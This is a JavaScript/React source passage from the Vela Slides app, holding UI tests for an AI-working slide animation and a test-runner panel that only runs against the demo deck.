// ── CR5: Consistent AI-working animation ─────────────────────────────
// Deterministic, offline-friendly proof of the unified aiWork → vera-thinking /
// magic-reveal contract. No live AI backend needed: we drive the reducer flag
// directly via the app's test hook (_hooks().setAIWork) and assert the
// on-screen slide's fx-wrapper class contract, the accent CSS var, off-screen
// isolation, and the CSS (accent-tinted sweep + reduced-motion) rules.
const _fxWrap = () => _$("[data-testid='slide-fx-wrapper']");
// Canonicalize a CSS color so an authored hex and a browser rgb() serialization
// compare equal. --vera-accent is a registered custom property
// (@property { syntax: "<color>" }) — once registered, getComputedStyle returns
// the COMPUTED "rgb(r, g, b)" form, not the "#rrggbb" the deck authored. Round
// tripping both sides through an element's computed `color` normalizes either
// serialization; if the UA can't parse the value we fall back to a whitespace-
// stripped lowercase compare (the pre-registration behaviour).
const _normColor = (v) => {
  const raw = String(v == null ? "" : v).trim();
  const flat = raw.toLowerCase().replace(/\s+/g, "");
  if (!raw) return "";
  try {
    const el = document.createElement("span");
    el.style.color = raw;
    if (!el.style.color) return flat;      // UA rejected it — nothing to normalize
    el.style.position = "absolute";
    el.style.visibility = "hidden";
    document.body.appendChild(el);
    const out = getComputedStyle(el).color;
    el.remove();
    return out ? out.toLowerCase().replace(/\s+/g, "") : flat;
  } catch { return flat; }
};
// Return the fx-wrapper to a static state (clear the flag, wait out any settle).
const _settleFx = async () => {
  if (typeof _hooks().setAIWork === "function") _hooks().setAIWork(null);
  await _waitFor(() => { const w = _fxWrap(); return w && !w.classList.contains("magic-reveal") && !w.classList.contains("vera-thinking"); }, 2600).catch(() => {});
};
// Bring the app to editor mode with a slide (and its fx-wrapper) on screen —
// a prior suite may leave it in fullscreen / gallery / a modal / a collapsed rail.
const _cr5Setup = async () => {
  await _exitFullscreen();
  document.activeElement?.blur?.();
  for (let i = 0; i < 3; i++) { _key("Escape"); await _wait(90); }
  // Prefer a TOC slide row — clicking it selects a module that actually HAS a
  // slide (the first .concept-row can be an empty section → "No slides yet",
  // which renders no fx-wrapper). Fall back to scanning module rows for one with
  // slides on screen.
  const toc = _tocRows()[0];
  if (toc) { _click(toc); await _wait(200); }
  if (!_$("[data-testid='slide-viewport']")) {
    for (const r of _$$(".concept-row")) { _click(r); await _wait(150); if (_$("[data-testid='slide-viewport']")) break; }
  }
  await _waitFor(_fxWrap, 3000).catch(() => {});
};
// Collect all readable CSS text (same-origin inline <style>; skip cross-origin).
const _allCssText = () => {
  let css = "";
  for (const sheet of Array.from(document.styleSheets)) {
    let rules; try { rules = sheet.cssRules; } catch { continue; }
    if (!rules) continue;
    for (const r of Array.from(rules)) css += r.cssText + "\n";
  }
  return css;
};
uiSuite("AI-working animation (CR5)", [
  { name: "test hooks + fx-wrapper present", fn: async () => {
    if (typeof _hooks().setAIWork !== "function") throw new Error("setAIWork test hook not exposed");
    if (typeof _hooks().getSelection !== "function") throw new Error("getSelection test hook not exposed");
    await _cr5Setup();
    if (!_fxWrap()) throw new Error("no fx-wrapper — diag=" + JSON.stringify({ conceptRows: _$$(".concept-row").length, tocRows: _tocRows().length, vp: !!_$("[data-testid='slide-viewport']"), sel: _hooks().getSelection() }));
  }},
  { name: "SET_AI_WORK on the on-screen slide → vera-thinking scan + accent var", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
    const w = await _waitFor(() => { const x = _fxWrap(); return x && x.classList.contains("vera-thinking") ? x : null; }, 2500);
    if (w.getAttribute("data-ai-working") !== "1") throw new Error("data-ai-working mirror not set");
    // Accent-tinted sweep: --vera-accent must be a non-empty color; when the
    // slide carries an accent it must equal it (the sweep matches the slide).
    const acc = getComputedStyle(w).getPropertyValue("--vera-accent").trim();
    if (!acc) throw new Error("--vera-accent empty while working");
    if (sel.accent) {
      // Serialization-tolerant: --vera-accent may come back as rgb(...) once the
      // custom property is registered, while the deck authors a hex.
      const a = _normColor(acc), b = _normColor(sel.accent);
      if (a !== b) throw new Error(`--vera-accent=${acc} (${a}) != slide accent ${sel.accent} (${b})`);
    }
    await _settleFx();
  }},
  { name: "clearing SET_AI_WORK → vera-thinking gone + magic-reveal settle", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    _hooks().setAIWork(null);
    // The completion effect swaps the scan for the one-shot magic-reveal.
    await _waitFor(() => { const w = _fxWrap(); return w && !w.classList.contains("vera-thinking") && w.classList.contains("magic-reveal"); }, 2500);
    // …and the reveal is one-shot — it settles back to static.
    await _waitFor(() => !_fxWrap()?.classList.contains("magic-reveal"), 3000).catch(() => {});
  }},
  { name: "off-screen target does NOT animate the on-screen slide", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    // A target that is not the on-screen slide (bogus itemId) must leave it static.
    _hooks().setAIWork({ itemId: "__cr5_no_such_item__", slideIdx: sel.slideIdx });
    await _wait(250);
    const w = _fxWrap();
    if (w && w.classList.contains("vera-thinking")) throw new Error("on-screen slide animated for an off-screen target");
    await _settleFx();
  }},
  { name: "D7: navigating away mid-op does NOT magic-reveal the destination slide", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    // Mark THIS slide as the AI target and confirm the working scan is up.
    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    // Navigate to another slide mid-op (either direction is a slideIndex change).
    const p0 = _slidePos();
    document.activeElement?.blur?.();
    _key("ArrowRight"); await _wait(140);
    if (_slidePos() === p0) { _key("ArrowLeft"); await _wait(140); }
    if (_slidePos() === p0) { await _settleFx(); return; } // single-slide deck: nothing to navigate
    // The destination slide must NOT play the completion settle — the op did not
    // finish here, the view merely moved. Give the effect ample time to (wrongly) fire.
    await _wait(400);
    const w = _fxWrap();
    if (w && w.classList.contains("magic-reveal")) throw new Error("destination slide wrongly played magic-reveal on mid-op navigation");
    await _settleFx();
  }},
  { name: "D7b: cross-module switch at same index does NOT magic-reveal destination (but genuine same-slide DOES)", fn: async () => {
    await _settleFx();
    // Map each TOC slide row to its {itemId, slideIdx} by selecting it.
    const n = _tocRows().length;
    if (n < 2) { await _settleFx(); return; } // single-slide deck — nothing to prove
    const meta = [];
    for (let i = 0; i < n; i++) { _click(_tocRows()[i]); await _wait(130); meta.push(_hooks().getSelection()); }
    // Module A = first slide-0 row; Module B = a LATER slide-0 row in a DIFFERENT module.
    let ai = -1, bi = -1;
    for (let i = 0; i < meta.length; i++) {
      if (meta[i] && meta[i].slideIdx === 0) {
        if (ai < 0) ai = i;
        else if (meta[i].itemId !== meta[ai].itemId) { bi = i; break; }
      }
    }
    if (ai < 0 || bi < 0) { await _settleFx(); return; } // deck lacks two modules with a slide-0 — soft pass
    // Select module A slide 0 and start its working scan.
    _click(_tocRows()[ai]); await _wait(160);
    const sA = _hooks().getSelection();
    _hooks().setAIWork({ itemId: sA.itemId, slideIdx: sA.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    // Single-step switch to module B slide 0 (same index, different module) while
    // aiWork is still set on A. The untouched destination must NOT settle.
    _click(_tocRows()[bi]); await _wait(180);
    const sB = _hooks().getSelection();
    if (!sB || sB.itemId === sA.itemId) { await _settleFx(); return; } // switch didn't land — soft pass
    await _wait(420); // give the completion effect ample time to (wrongly) fire
    const wB = _fxWrap();
    if (wB && wB.classList.contains("magic-reveal")) throw new Error("cross-module switch wrongly magic-revealed the untouched destination slide (0===0 index collision)");
    await _settleFx();
    // Control: a GENUINE same-slide completion must STILL magic-reveal (not over-suppressed).
    _click(_tocRows()[ai]); await _wait(160);
    const sA2 = _hooks().getSelection();
    _hooks().setAIWork({ itemId: sA2.itemId, slideIdx: sA2.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    _hooks().setAIWork(null);
    await _waitFor(() => { const x = _fxWrap(); return x && x.classList.contains("magic-reveal"); }, 2500);
    await _settleFx();
  }},
  { name: "CSS: accent-tinted .vera-thinking + .magic-reveal rules exist", fn: async () => {
    const css = _allCssText();
    if (!/\.vera-thinking/.test(css)) throw new Error(".vera-thinking rule missing");
    if (!/\.magic-reveal/.test(css)) throw new Error(".magic-reveal rule missing");
    if (!/--vera-accent/.test(css)) throw new Error(".vera-thinking sweep not parameterized by --vera-accent");
  }},
  { name: "CSS: prefers-reduced-motion zeroes the working scan", fn: async () => {
    let found = false;
    for (const sheet of Array.from(document.styleSheets)) {
      let rules; try { rules = sheet.cssRules; } catch { continue; }
      if (!rules) continue;
      for (const r of Array.from(rules)) {
        // CSSMediaRule (type 4) — r.cssText carries the full nested block.
        const txt = r.cssText || "";
        if (r.type === 4 && /prefers-reduced-motion/i.test(txt) && /\.vera-thinking/.test(txt) && /animation[^;]*none/i.test(txt)) found = true;
      }
    }
    if (!found) throw new Error("prefers-reduced-motion block zeroing .vera-thinking animation missing");
  }},
], { setup: _cr5Setup });

// ━━━ UI TEST RUNNER COMPONENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Demo deck guard — UI tests only run against the original demo deck
// to avoid mutating user work. Reads live deck title from DOM header.

function computeDeckFingerprint() {
  try {
    // Read LIVE deck title from header (reflects current state, not embedded data)
    const titleEl = _$$("header span").find((s) => {
      const fw = s.style?.fontWeight;
      return (fw === "700" || fw === 700 || fw === "bold") && s.textContent?.length > 1;
    });
    const liveTitle = titleEl?.textContent?.trim() || "";

    // Read slide count from DOM (e.g. "21sl" or slide counter "3 / 8")
    const statsEl = _$$("header span").find((s) => s.textContent?.includes("sl") && s.textContent?.includes("§"));
    let slideCount = 0;
    if (statsEl) {
      const m = statsEl.textContent.match(/(\d+)sl/);
      if (m) slideCount = parseInt(m[1]);
    }

    // Build fingerprint from live DOM state
    if (liveTitle) return `${liveTitle}|${slideCount}`;
    return null;
  } catch { return null; }
}

// Fingerprint: "title|slideCount" — matches demo deck as assembled
const DEMO_DECK_FP_TITLE = "Vela Slides \u2014 Live Demo";

function VelaUITestRunner() {
  const [running, setRunning] = useState(false);
  const [results, setResults] = useState(null);
  const [progress, setProgress] = useState(null);
  const [expanded, setExpanded] = useState(false);
  const [copied, setCopied] = useState(false);
  const [warning, setWarning] = useState(null);
  const [hasRun, setHasRun] = useState(false);

  const run = async (force) => {
    // Fingerprint check — only run against demo deck unless forced
    if (!force) {
      const fp = computeDeckFingerprint();
      const isDemo = fp && fp.startsWith(DEMO_DECK_FP_TITLE + "|");
      if (!isDemo) {
        setWarning({ fp: fp || "(unable to read deck)", expected: DEMO_DECK_FP_TITLE });
        return;
      }
    }
    setWarning(null);
    setRunning(true);
    setResults(null);
    setExpanded(true);
    const res = await runUITests((p) => setProgress(p));
    setResults(res);
    setRunning(false);
    setProgress(null);
    setHasRun(true);
  };

  // Ctrl+Alt+T or custom event triggers
  useEffect(() => {
    const keyHandler = (e) => {
      if (e.ctrlKey && e.altKey && e.key === "t") {
        e.preventDefault();
        if (!running) run();
      }
    };
    const eventHandler = () => { if (!running) run(); };
    window.addEventListener("keydown", keyHandler);
    window.addEventListener("vela-run-uitests", eventHandler);
    return () => { window.removeEventListener("keydown", keyHandler); window.removeEventListener("vela-run-uitests", eventHandler); };
  }, [running]);

  const copyResults = () => {
    if (!results) return;
    const passed = results.filter((r) => r.pass === true).length;
    const failed = results.filter((r) => r.pass === false).length;
    const skipped = results.filter((r) => r.pass === "skip").length;
    const lines = [
      `⛵ Vela UI Tests — v${VELA_VERSION}`,
      `${passed} passed, ${failed} failed, ${skipped} skipped, ${results.length} total`,
      `${new Date().toISOString()}`,
      "",
      ...results.map((r) => `${r.pass === true ? "✅" : r.pass === "skip" ? "⏭️" : "❌"} [${r.suite}] ${r.name} (${r.ms}ms)${r.error ? ` — ${r.error}` : ""}`),
    ];
    const text = lines.join("\n");
    velaClipboard(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!results && !running && !warning) {
    // Show mini rerun button if tests have been run before
    if (!hasRun) return null;
    return (
      <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999 }}>
        <button onClick={() => run()} style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(15,23,42,0.9)", border: "1px solid rgba(99,102,241,0.4)", color: "#818cf8", fontSize: 16, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 16px rgba(0,0,0,0.4)", backdropFilter: "blur(8px)" }} title="Re-run UI Tests (Ctrl+Alt+T)">🧪</button>
      </div>
    );
  }

  // Warning: wrong deck loaded
  if (warning && !running && !results) return (
    <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999, fontFamily: FONT.mono, maxWidth: 380 }}>
      <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: "1px solid rgba(251,191,36,0.5)", boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", padding: "14px 16px" }}>
        <div style={{ fontSize: 12, fontWeight: 700, color: "#fbbf24", marginBottom: 8, display: "flex", alignItems: "center", gap: 6 }}>
          <span>⚠️</span> UI Tests — Wrong Deck
        </div>
        <div style={{ fontSize: 10, color: "#94a3b8", lineHeight: 1.6, marginBottom: 10 }}>
          UI tests are designed for the demo deck and may modify slides. Current deck doesn't match the expected fingerprint.
        </div>
        <div style={{ fontSize: 8, color: "#475569", marginBottom: 10, wordBreak: "break-all" }}>
          Current: {warning.fp || "(unknown)"}<br />
          Expected title: {warning.expected}
        </div>
        <div style={{ display: "flex", gap: 6 }}>
          <button onClick={() => run(true)} style={{ padding: "5px 12px", fontSize: 10, fontWeight: 700, background: "rgba(251,191,36,0.2)", border: "1px solid rgba(251,191,36,0.4)", borderRadius: 4, color: "#fbbf24", cursor: "pointer" }}>Run anyway</button>
          <button onClick={() => setWarning(null)} style={{ padding: "5px 12px", fontSize: 10, background: "rgba(255,255,255,0.1)", border: "1px solid rgba(255,255,255,0.15)", borderRadius: 4, color: "#94a3b8", cursor: "pointer" }}>Cancel</button>
        </div>
      </div>
    </div>
  );

  const passed = results?.filter((r) => r.pass === true).length || 0;
  const failed = results?.filter((r) => r.pass === false).length || 0;
  const skippedCount = results?.filter((r) => r.pass === "skip").length || 0;
  const total = results?.length || 0;
  const totalMs = results?.reduce((s, r) => s + r.ms, 0) || 0;

  // Group by suite
  const suites = {};
  (results || []).forEach((r) => {
    if (!suites[r.suite]) suites[r.suite] = [];
    suites[r.suite].push(r);
  });

  return (
    <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999, display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6, fontFamily: FONT.mono, maxWidth: 420 }}>
      {/* Live progress while running */}
      {running && progress && (
        <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: "1px solid rgba(59,130,246,0.5)", boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", overflow: "hidden", maxWidth: 380, display: "flex", flexDirection: "column" }}>
          {/* Progress header */}
          <div style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, borderBottom: "1px solid rgba(255,255,255,0.1)" }}>
            <span style={{ animation: "spin 1s linear infinite", display: "inline-block", fontSize: 14 }}>🧪</span>
            <span style={{ fontSize: 12, fontWeight: 700, color: "#fff" }}>{progress.done}/{progress.total}</span>
            <span style={{ fontSize: 10, color: "#34d399", fontWeight: 600 }}>✓ {progress.passed || 0}</span>
            {(progress.failed || 0) > 0 && <span style={{ fontSize: 10, color: "#f87171", fontWeight: 600 }}>✗ {progress.failed}</span>}
            {(progress.skipped || 0) > 0 && <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600 }}>⏭️ {progress.skipped}</span>}
            <div style={{ flex: 1 }} />
            <span style={{ fontSize: 9, color: "rgba(255,255,255,0.4)" }}>{Math.round((progress.done / progress.total) * 100)}%</span>
          </div>
          {/* Progress bar */}
          <div style={{ height: 3, background: "rgba(255,255,255,0.1)" }}>
            <div style={{ height: "100%", background: (progress.failed || 0) > 0 ? "#f87171" : "#3b82f6", width: `${(progress.done / progress.total) * 100}%`, transition: "width 0.15s" }} />
          </div>
          {/* Current test */}
          <div style={{ padding: "6px 14px", fontSize: 10, color: "rgba(255,255,255,0.6)" }}>
            {progress.suite} → {progress.test}
          </div>
          {/* Live failures */}
          {progress.results && progress.results.filter((r) => r.pass === false).length > 0 && (
            <div style={{ maxHeight: 160, overflowY: "auto", padding: "0 14px 8px" }}>
              {progress.results.filter((r) => r.pass === false).map((r, i) => (
                <div key={i} style={{ fontSize: 10, color: "#f87171", padding: "3px 0", lineHeight: 1.4 }}>
                  ✗ <span style={{ fontWeight: 600 }}>[{r.suite}]</span> {r.name}
                  {r.error && <div style={{ fontSize: 9, color: "#f87171", opacity: 0.7, paddingLeft: 12 }}>↳ {r.error}</div>}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Results panel */}
      {results && (
        <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: `1px solid ${failed > 0 ? "rgba(239,68,68,0.5)" : "rgba(16,185,129,0.5)"}`, boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", overflow: "hidden", maxHeight: expanded ? "80vh" : "auto", display: "flex", flexDirection: "column" }}>
          {/* Header */}
          <div onClick={() => setExpanded((v) => !v)} style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, cursor: "pointer", borderBottom: expanded ? "1px solid rgba(255,255,255,0.1)" : "none" }}>
            <span style={{ fontSize: 14 }}>{failed > 0 ? "❌" : "✅"}</span>
            <span style={{ fontSize: 12, fontWeight: 700, color: "#fff" }}>UI Tests: {passed}/{total}</span>
            {skippedCount > 0 && <span style={{ fontSize: 9, color: "#94a3b8", fontWeight: 600 }}>⏭️ {skippedCount} skipped</span>}
            <span style={{ fontSize: 9, color: "rgba(255,255,255,0.5)" }}>{(totalMs / 1000).toFixed(1)}s · v{VELA_VERSION}</span>
            <div style={{ flex: 1 }} />
            <button onClick={(e) => { e.stopPropagation(); copyResults(); }} style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)", color: "#fff", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontSize: 9, fontFamily: FONT.mono }}>{copied ? "Copied!" : "📋"}</button>
            <button onClick={(e) => { e.stopPropagation(); run(); }} style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)", color: "#fff", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontSize: 9, fontFamily: FONT.mono }}>🔄</button>
            <button onClick={(e) => { e.stopPropagation(); setResults(null); setExpanded(false); }} style={{ background: "none", border: "none", color: "rgba(255,255,255,0.4)", cursor: "pointer", fontSize: 12, padding: "0 2px" }}>✕</button>
          </div>

          {/* Expanded results */}
          {expanded && (
            <div style={{ overflowY: "auto", maxHeight: "60vh", padding: "6px 0" }}>
              {Object.entries(suites).map(([name, tests]) => {
                const suiteFailed = tests.filter((t) => t.pass === false).length;
                const suiteSkipped = tests.filter((t) => t.pass === "skip").length;
                const suitePassed = suiteFailed === 0;
                return (
                  <div key={name} style={{ padding: "4px 14px" }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: suitePassed ? "#34d399" : "#f87171", padding: "4px 0", display: "flex", alignItems: "center", gap: 6 }}>
                      <span>{suitePassed ? "✅" : "❌"}</span>
                      <span>{name}</span>
                      <span style={{ fontSize: 8, color: "rgba(255,255,255,0.3)" }}>{tests.length} tests{suiteFailed > 0 ? `, ${suiteFailed} failed` : ""}{suiteSkipped > 0 ? `, ${suiteSkipped} skipped` : ""}</span>
                    </div>
                    {tests.map((t, i) => (
                      <div key={i} style={{ fontSize: 9, padding: "2px 0 2px 18px", color: t.pass === true ? "rgba(255,255,255,0.5)" : t.pass === "skip" ? "#94a3b8" : "#f87171", lineHeight: 1.5 }}>
                        {t.pass === true ? "✓" : t.pass === "skip" ? "⏭️" : "✗"} {t.name} <span style={{ color: "rgba(255,255,255,0.2)" }}>{t.ms}ms</span>
                        {t.error && <div style={{ color: t.pass === "skip" ? "#94a3b8" : "#f87171", fontSize: 8, paddingLeft: 12 }}>↳ {t.error}</div>}
                      </div>
                    ))}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
